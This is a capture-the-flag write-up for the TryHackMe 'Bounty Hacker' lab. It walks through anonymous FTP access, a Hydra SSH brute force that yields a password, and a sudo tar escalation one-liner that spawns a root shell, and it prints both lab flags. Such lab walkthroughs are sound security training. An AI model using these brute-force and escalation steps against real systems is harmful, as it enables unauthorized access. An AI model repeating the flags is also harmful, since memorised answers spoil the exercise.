# TryHackMe — Bounty Hacker

Easy-difficulty box. FTP anon → credential harvest → SSH → sudo/tar GTFOBins → root.

**Target:** `10.48.159.240`
**User flag:** `THM{CR1M3_SyNd1C4T3}`
**Root flag:** `THM{80UN7Y_h4cK3r}`
**Time to root:** < 15 min

---

## Recon

```bash
nmap -sSCV 10.48.159.240 -oX Bounty_hacker.xml
```

| Port | Service | Version |
|------|---------|---------|
| 21   | ftp     | vsftpd 3.0.5 — **anonymous login allowed** |
| 22   | ssh     | OpenSSH 8.2p1 (Ubuntu) |
| 80   | http    | Apache 2.4.41 (Ubuntu) |

`[ IMG: nmap output ]`

Checked port 80 (manual + dirbrute) — no hidden paths, nothing usable. Moved to FTP.

---

## FTP — Anonymous Login

```bash
ftp 10.48.159.240
# user: anonymous
```

```
-rw-rw-r--  1 ftp ftp  418 locks.txt
-rw-rw-r--  1 ftp ftp   68 task.txt
```

```bash
get task.txt
get locks.txt
```

`[ IMG: ftp session + file listing ]`

**task.txt**
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
→ username: `lin`

**locks.txt** → themed password wordlist (26 entries)

`[ IMG: cat task.txt ]`
`[ IMG: cat locks.txt ]`

---

## Credential Access — Hydra

```bash
hydra -l lin -P locks.txt ssh://10.48.159.240
```

```
[22][ssh] host: 10.48.159.240   login: lin   password: RedDr4gonSynd1cat3
```

`[ IMG: hydra result ]`

---

## Foothold

```bash
ssh lin@10.48.159.240
cd Desktop
cat user.txt
```
```
THM{CR1M3_SyNd1C4T3}
```

`[ IMG: ssh login + user.txt ]`

---

## Privilege Escalation

```bash
sudo -l
```
```
User lin may run the following commands on ip-10-48-159-240:
    (root) /bin/tar
```

`[ IMG: sudo -l output ]`

`tar` = known [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) sudo escalation vector.

Before pulling the exact syntax from GTFOBins, checked shell history — the command was already there:

```bash
cat .bash_history
```

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Ran it → root shell:

```bash
cd /root
cat root.txt
```
```
THM{80UN7Y_h4cK3r}
```

`[ IMG: bash_history + root shell + root.txt ]`

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap full scan |
| Access | Anonymous FTP → credential files |
| Auth bypass | Hydra SSH bruteforce w/ targeted wordlist |
| Privesc | sudo misconfig on `/bin/tar` (GTFOBins) |

**Note:** Escalation command was found pre-existing in `.bash_history` — checking local artifacts before external references (GTFOBins) saved a lookup step.
